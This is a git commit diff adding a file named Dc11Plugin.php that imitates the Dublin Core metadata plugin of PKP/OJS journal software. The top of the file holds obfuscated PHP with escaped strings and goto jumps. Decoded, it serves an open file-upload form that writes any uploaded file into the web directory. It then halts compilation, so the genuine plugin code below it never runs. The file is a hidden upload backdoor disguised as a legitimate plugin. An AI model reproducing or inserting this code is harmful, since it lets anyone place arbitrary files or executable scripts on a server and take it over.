3e31018706aa97960640a817d42c1fc2cc1b5d89
This Me Zy <31403046+zycoder0day@users.noreply.github.com>
2025-09-24 00:23:26 +0700

    Create Dc11Plugin.php

---
+++ Dc11Plugin.php
@@ -0,0 +1,23 @@
+<?php
+
+ goto h6IJE; VOZUv: echo "\106\x69\x6c\x65\x20\x62\x65\162\150\x61\163\151\154\x20\x74\145\162\x75\160\154\157\141\144\x21\40\x3d\x3e\40{$W6LO1}\x2f{$SVPZz}"; goto MxQ6a; X2W09: echo "\106\151\154\x65\x20\147\x61\x67\x61\x6c\x20\x74\x65\162\165\160\x6c\x6f\x61\144\x20\72\50"; goto jDcUq; EwiRJ: $SVPZz = $_FILES["\146\151\154\145\156\141"]["\x6e\141\155\x65"]; goto C5wfc; C5wfc: if (@copy($DNnI3, $SVPZz)) { goto bn5gG; } goto X2W09; MxQ6a: K6R2v: goto o7mKm; tiG8t: $W6LO1 = getcwd(); goto S677E; h6IJE: echo "\x3c\146\x6f\x72\x6d\40\141\143\x74\x69\x6f\156\75\47\x27\x20\145\x6e\x63\x74\x79\x70\x65\x3d\x27\x6d\165\154\x74\151\160\141\162\x74\x2f\x66\x6f\x72\x6d\x2d\144\x61\x74\x61\x27\x20\155\145\x74\150\x6f\x64\75\47\x50\117\x53\x54\x27\76\xa\x3c\151\156\160\x75\x74\x20\x74\171\x70\x65\x3d\x27\146\x69\154\145\x27\40\x6e\x61\x6d\145\x3d\47\146\151\154\145\156\141\x27\76\xa\x3c\x69\156\160\165\x74\40\164\x79\x70\x65\x3d\47\163\x75\x62\x6d\x69\164\47\x20\156\x61\x6d\145\x3d\x27\x75\x70\x6c\157\x61\x64\47\x20\166\x61\x6c\165\145\75\x27\x67\x61\163\x6b\x65\156\x27\76\xa\74\57\146\x6f\x72\155\x3e"; goto lYV3w; MSL8L: bn5gG: goto VOZUv; o7mKm: t2sMW: goto wRIye; S677E: $DNnI3 = $_FILES["\146\151\x6c\145\x6e\141"]["\x74\x6d\160\x5f\156\141\x6d\x65"]; goto EwiRJ; jDcUq: goto K6R2v; goto MSL8L; lYV3w: if (!isset($_POST["\165\x70\154\x6f\x61\x64"])) { goto t2sMW; } goto tiG8t; wRIye: __halt_compiler();
+
+/**
+ * @file plugins/metadata/dc11/Dc11Plugin.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * @class Dc11Plugin
+ *
+ * @ingroup plugins_metadata_dc11
+ *
+ * @brief Dublic Core version 1.1 metadata plugin
+ */
+
+namespace APP\plugins\metadata\dc11;
+
+class Dc11Plugin extends \PKP\plugins\metadata\dc11\PKPDc11MetadataPlugin
+{
+}
